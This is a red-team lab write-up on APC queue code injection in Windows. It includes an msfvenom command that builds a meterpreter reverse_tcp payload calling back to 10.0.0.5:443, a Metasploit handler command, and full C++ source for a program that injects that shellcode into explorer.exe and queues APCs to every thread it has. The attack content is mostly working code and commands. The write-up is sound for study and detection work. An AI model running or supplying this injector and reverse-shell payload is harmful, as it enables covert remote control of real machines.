# APC Queue Code Injection

This lab looks at the APC \(Asynchronous Procedure Calls\) queue code injection - a well known technique I had not played with in the past.

Some simplified context around threads and APC queues:

* Threads execute code within processes
* Threads can execute code asynchronously by leveraging APC queues
* Each thread has a queue that stores all the APCs
* Application can queue an APC to a given thread \(subject to privileges\)
* When a thread is scheduled, queued APCs get executed
* Disadvantage of this technique is that the malicious program cannot force the victim thread to execute the injected code - the thread to which an APC was queued to, needs to enter/be in an [alertable](apc-queue-code-injection.md#alertable-state) state \(i.e [`SleepEx`](https://msdn.microsoft.com/en-us/library/ms686307%28v=VS.85%29.aspx)\), but you may want to check out [Shellcode Execution in a Local Process with QueueUserAPC and NtTestAlert](shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert.md)

## Execution

A high level overview of how this lab works:

* Write a C++ program apcqueue.exe that will:
  * Find explorer.exe process ID
  * Allocate memory in explorer.exe process memory space
  * Write shellcode to that memory location
  * Find all threads in explorer.exe
  * Queue an APC to all those threads. APC points to the shellcode
* Execute the above program
* When threads in explorer.exe get scheduled, our shellcode gets executed
* Rain of meterpreter shells

Let's start by creating a meterpreter shellcode to be injected into the victim process:

{% code title="attacker@kali" %}
```csharp
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c
```
{% endcode %}

![](../../.gitbook/assets/annotation-2019-05-26-111814.png)

I will be injecting the shellcode into `explorer.exe` since there's usually a lot of thread activity going on, so there is a better chance to encounter a thread in an alertable state that will kick off the shellcode. I will find the process I want to inject into with `Process32First` and `Process32Next` calls:

![](../../.gitbook/assets/annotation-2019-05-26-152927.png)

Once explorer PID is found, we need to get a handle to the explorer.exe process and allocate some memory for the shellcode. The shellcode is written to explorer's process memory and additionally, an APC routine, which now points to the shellcode, is declared:

![](../../.gitbook/assets/annotation-2019-05-26-151203.png)

If we compile and execute `apcqueue.exe`, we can indeed see the shellcode gets injected into the process successully:

![](../../.gitbook/assets/annotation-2019-05-26-133126.png)

A quick detour - the below shows a screenshot from the Process Hacker where our malicious program has a handle to explorer.exe - good to know for debugging and troubleshooting:

![](../../.gitbook/assets/annotation-2019-05-26-133312.png)

Back to the code - we can now enumerate all threads of explorer.exe and queue an APC \(points to the shellcode\) to them:

![sleep for some throttling](../../.gitbook/assets/annotation-2019-05-26-151757%20%281%29.png)

Switching gears to the attacking machine - let's fire up a multi handler and set an `autorunscript` to migrate meterpreter sessions to some other process before they die with the dying threads:

{% code title="attacker@kali" %}
```csharp
msfconsole -x "use exploits/multi/handler; set lhost 10.0.0.5; set lport 443; set payload windows/x64/meterpreter/reverse_tcp; exploit"
set autorunscript post/windows/manage/migrate
```
{% endcode %}

Once the `apcqueue` is compiled and run,  a meterpreter session is received - the technique worked:

![](../../.gitbook/assets/annotation-2019-05-26-134126.png)

## States

As mentioned earlier, in order for the APC code injection to work, the thread to which an APC is queued, needs to be in an `alertable` state. 

To get a better feel of what this means, I created another project called `alertable` that only did one thing - slept for 60 seconds. The application was sent to sleep using \(note the important second parameter\):

```cpp
DWORD SleepEx(
  DWORD dwMilliseconds,
  BOOL  bAlertable
);
```

Let's put the new project to sleep in both alertable and non-alertable states and see what heppens when an APC is queued to it.

### Alertable State

Let's compile the `alertable.exe` binary with `bAleertable = true` first and then launch the `apcqueue.exe`. 

Since `alertable.exe` was in an alertable state, the code got executed immediately and a meterpreter session was established:

![](../../.gitbook/assets/apcqueueinjection.gif)

### Non-Alertable State

Now let's recompile `alertable.exe` with `bAlertable == false` and try again - shellcode does not get executed:

![](../../.gitbook/assets/apcqueueinjection-nonalertable.gif)

## Powershell -sta

An interesting observation is that if you try injecting into powershell.exe which was started with a `-sta` switch \(Single Thread Apartment\), we do not need to spray the APC across all its threads - main thread is enough and gives a reliable shell:

![](../../.gitbook/assets/apc-powershell.gif)

Note that the injected powershell process becomes unresponsive. 

## Code

{% code title="apcqueue.cpp" %}
```cpp
#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>

int main()
{
	unsigned char buf[] = "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\x0a\x00\x00\x05\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5";

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	HANDLE victimProcess = NULL;
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
	std::vector<DWORD> threadIds;
	SIZE_T shellSize = sizeof(buf);
	HANDLE threadHandle = NULL;

	if (Process32First(snapshot, &processEntry)) {
		while (_wcsicmp(processEntry.szExeFile, L"explorer.exe") != 0) {
			Process32Next(snapshot, &processEntry);
		}
	}
	
	victimProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
	WriteProcessMemory(victimProcess, shellAddress, buf, shellSize, NULL);

	if (Thread32First(snapshot, &threadEntry)) {
		do {
			if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
				threadIds.push_back(threadEntry.th32ThreadID);
			}
		} while (Thread32Next(snapshot, &threadEntry));
	}
	
	for (DWORD threadId : threadIds) {
		threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
		QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
		Sleep(1000 * 2);
	}
	
	return 0;
}
```
{% endcode %}

## References

{% embed url="https://blogs.microsoft.co.il/pavely/2017/03/14/injecting-a-dll-without-a-remote-thread/" %}

{% embed url="http://rinseandrepeatanalysis.blogspot.com/2019/04/early-bird-injection-apc-abuse.html?m=1" %}

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/sync/asynchronous-procedure-calls" %}

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-queueuserapc" %}

